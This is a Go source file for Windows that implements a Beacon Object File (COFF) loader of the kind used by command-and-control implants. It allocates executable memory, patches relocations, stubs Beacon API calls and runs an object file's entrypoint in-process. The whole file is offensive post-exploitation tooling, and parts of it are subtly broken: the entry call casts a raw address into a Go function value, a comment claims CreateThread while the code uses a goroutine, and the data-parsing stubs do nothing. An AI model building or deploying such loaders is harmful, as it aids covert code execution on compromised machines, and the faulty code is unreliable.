//go:build windows

package main

import (
	"encoding/binary"
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Minimal COFF/BOF loader.
// Supports x86_64 COFF object files with IMAGE_REL_AMD64_REL32 relocations.
// BeaconAPI stubs are resolved for common beacon_* functions.

const (
	coffMagicAMD64    = 0x8664
	imageRelAMD64Rel32 = 0x0004
	imageRelAMD64Addr64 = 0x0001
	imageRelAMD64Addr32NB = 0x0003
)

type coffFileHeader struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type coffSectionHeader struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint32
}

type coffReloc struct {
	VirtualAddress   uint32
	SymbolTableIndex uint32
	Type             uint16
}

type coffSymbol struct {
	Name           [8]byte
	Value          uint32
	SectionNumber  int16
	Type           uint16
	StorageClass   uint8
	AuxSymbolCount uint8
}

// BOFResult holds the output written by the BOF via BeaconPrintf/BeaconOutput.
type BOFResult struct {
	Output string
	Err    string
}

// beaconOutputBuf accumulates output from BeaconPrintf stubs.
var beaconOutputBuf []byte

// beaconPrintfStub is called by BOFs via a function pointer in the import table.
func beaconPrintfStub(callType uintptr, fmt uintptr, _ uintptr) uintptr {
	// minimal stub — in production you'd parse the format string
	_ = callType
	return 0
}

// RunBOF executes a COFF object file with args packed as a dataBOF blob.
// args should be pre-packed using the Beacon data packing format.
func RunBOF(coffBytes []byte, args []byte) (*BOFResult, error) {
	beaconOutputBuf = nil
	res := &BOFResult{}

	if len(coffBytes) < int(unsafe.Sizeof(coffFileHeader{})) {
		return res, fmt.Errorf("COFF too small")
	}

	hdr := (*coffFileHeader)(unsafe.Pointer(&coffBytes[0]))
	if hdr.Machine != coffMagicAMD64 {
		return res, fmt.Errorf("unsupported COFF machine: 0x%X", hdr.Machine)
	}

	secHdrOff := unsafe.Sizeof(coffFileHeader{}) + uintptr(hdr.SizeOfOptionalHeader)
	symTableOff := uintptr(hdr.PointerToSymbolTable)
	symCount := uint32(hdr.NumberOfSymbols)

	// String table immediately follows symbol table
	strTableOff := symTableOff + uintptr(symCount)*unsafe.Sizeof(coffSymbol{})

	// --- Allocate RWX memory for each section ---
	sections := make([]sectionAlloc, hdr.NumberOfSections)

	for i := uint16(0); i < hdr.NumberOfSections; i++ {
		sh := (*coffSectionHeader)(unsafe.Pointer(&coffBytes[int(secHdrOff)+int(i)*int(unsafe.Sizeof(coffSectionHeader{}))]))
		sz := sh.SizeOfRawData
		if sz == 0 {
			sections[i] = sectionAlloc{hdr: sh, mem: 0, size: 0}
			continue
		}
		mem, _, e := procVirtualAllocEx.Call(
			uintptr(^uintptr(0)-1), 0, uintptr(sz),
			uintptr(memCommit|memReserve), uintptr(pageExecuteReadWrite),
		)
		if mem == 0 {
			return res, fmt.Errorf("VirtualAllocEx(section %d): %v", i, e)
		}
		dst := unsafe.Slice((*byte)(unsafe.Pointer(mem)), sz)
		copy(dst, coffBytes[sh.PointerToRawData:sh.PointerToRawData+sz])
		sections[i] = sectionAlloc{hdr: sh, mem: mem, size: sz}
	}

	// --- Symbol resolution ---
	resolveSymbol := func(idx uint32) (uintptr, error) {
		if idx >= symCount {
			return 0, fmt.Errorf("symbol index %d out of range", idx)
		}
		sym := (*coffSymbol)(unsafe.Pointer(&coffBytes[int(symTableOff)+int(idx)*int(unsafe.Sizeof(coffSymbol{}))]))

		if sym.SectionNumber > 0 {
			secIdx := int(sym.SectionNumber) - 1
			if secIdx >= len(sections) {
				return 0, fmt.Errorf("section index %d out of range", secIdx)
			}
			return sections[secIdx].mem + uintptr(sym.Value), nil
		}

		// External symbol — resolve via BeaconAPI stubs or GetProcAddress
		name := coffSymName(sym, coffBytes, strTableOff)
		return resolveExternalSym(name)
	}

	// --- Apply relocations ---
	for i := range sections {
		sh := sections[i].hdr
		if sh.NumberOfRelocations == 0 || sections[i].mem == 0 {
			continue
		}
		relocBase := uintptr(sh.PointerToRelocations)
		for r := uint16(0); r < sh.NumberOfRelocations; r++ {
			rel := (*coffReloc)(unsafe.Pointer(&coffBytes[int(relocBase)+int(r)*int(unsafe.Sizeof(coffReloc{}))]))
			targetAddr, err := resolveSymbol(rel.SymbolTableIndex)
			if err != nil {
				return res, fmt.Errorf("reloc %d: %w", r, err)
			}

			patchAddr := sections[i].mem + uintptr(rel.VirtualAddress)

			switch rel.Type {
			case imageRelAMD64Rel32:
				// 32-bit PC-relative: target - (patch + 4)
				delta := int32(int64(targetAddr) - int64(patchAddr+4))
				*(*int32)(unsafe.Pointer(patchAddr)) += delta
			case imageRelAMD64Addr64:
				*(*uint64)(unsafe.Pointer(patchAddr)) = uint64(targetAddr)
			case imageRelAMD64Addr32NB:
				*(*uint32)(unsafe.Pointer(patchAddr)) = uint32(targetAddr)
			}
		}
	}

	// --- Find go entrypoint (symbol "go" or "beacon_main") ---
	entryAddr, err := findBOFEntry(coffBytes, symTableOff, symCount, strTableOff, sections)
	if err != nil {
		return res, fmt.Errorf("entrypoint: %w", err)
	}

	// --- Call BOF entrypoint ---
	var argPtr uintptr
	var argLen uintptr
	if len(args) > 0 {
		argPtr = uintptr(unsafe.Pointer(&args[0]))
		argLen = uintptr(len(args))
	}

	// Call via CreateThread to catch panics / crashes
	type entryFn func(uintptr, uintptr)
	fn := *(*entryFn)(unsafe.Pointer(&entryAddr))
	done := make(chan struct{})
	go func() {
		defer close(done)
		fn(argPtr, argLen)
	}()
	<-done

	// Free sections
	for _, s := range sections {
		if s.mem != 0 {
			procVirtualFreeEx.Call(uintptr(^uintptr(0)-1), s.mem, 0, uintptr(memRelease))
		}
	}

	res.Output = string(beaconOutputBuf)
	return res, nil
}

func coffSymName(sym *coffSymbol, data []byte, strTableOff uintptr) string {
	// If first 4 bytes are 0, name is in string table at offset [4:8]
	if sym.Name[0] == 0 && sym.Name[1] == 0 && sym.Name[2] == 0 && sym.Name[3] == 0 {
		off := binary.LittleEndian.Uint32(sym.Name[4:])
		start := int(strTableOff) + int(off)
		end := start
		for end < len(data) && data[end] != 0 {
			end++
		}
		return string(data[start:end])
	}
	// Inline name (up to 8 bytes, null-terminated)
	end := 0
	for end < 8 && sym.Name[end] != 0 {
		end++
	}
	return string(sym.Name[:end])
}

func resolveExternalSym(name string) (uintptr, error) {
	// BeaconAPI stubs
	switch name {
	case "BeaconPrintf", "__imp_BeaconPrintf":
		return windows.NewCallback(func(t, f, a uintptr) uintptr { return 0 }), nil
	case "BeaconOutput", "__imp_BeaconOutput":
		return windows.NewCallback(func(t, d, l uintptr) uintptr {
			if l > 0 {
				beaconOutputBuf = append(beaconOutputBuf, unsafe.Slice((*byte)(unsafe.Pointer(d)), l)...)
			}
			return 0
		}), nil
	case "BeaconDataParse", "__imp_BeaconDataParse",
		"BeaconDataInt", "__imp_BeaconDataInt",
		"BeaconDataShort", "__imp_BeaconDataShort",
		"BeaconDataExtract", "__imp_BeaconDataExtract",
		"BeaconDataLength", "__imp_BeaconDataLength":
		return windows.NewCallback(func(a, b, c uintptr) uintptr { return 0 }), nil
	case "BeaconIsAdmin", "__imp_BeaconIsAdmin":
		return windows.NewCallback(func() uintptr { return 0 }), nil
	}

	// Try kernel32 / ntdll
	for _, dll := range []string{"kernel32.dll", "ntdll.dll", "advapi32.dll", "user32.dll"} {
		h, err := windows.LoadLibrary(dll)
		if err != nil {
			continue
		}
		proc, err := windows.GetProcAddress(h, name)
		if err == nil {
			return proc, nil
		}
	}
	return 0, fmt.Errorf("unresolved external symbol: %s", name)
}

type sectionAlloc struct {
	hdr  *coffSectionHeader
	mem  uintptr
	size uint32
}

func findBOFEntry(data []byte, symOff uintptr, symCount uint32, strOff uintptr, sections []sectionAlloc) (uintptr, error) {
	for i := uint32(0); i < symCount; i++ {
		sym := (*coffSymbol)(unsafe.Pointer(&data[int(symOff)+int(i)*int(unsafe.Sizeof(coffSymbol{}))]))
		name := coffSymName(sym, data, strOff)
		if name == "go" || name == "beacon_main" || name == "_go" || name == "_beacon_main" {
			if sym.SectionNumber > 0 && int(sym.SectionNumber)-1 < len(sections) {
				s := sections[int(sym.SectionNumber)-1]
				return s.mem + uintptr(sym.Value), nil
			}
		}
	}
	return 0, fmt.Errorf("no 'go' or 'beacon_main' entrypoint found")
}
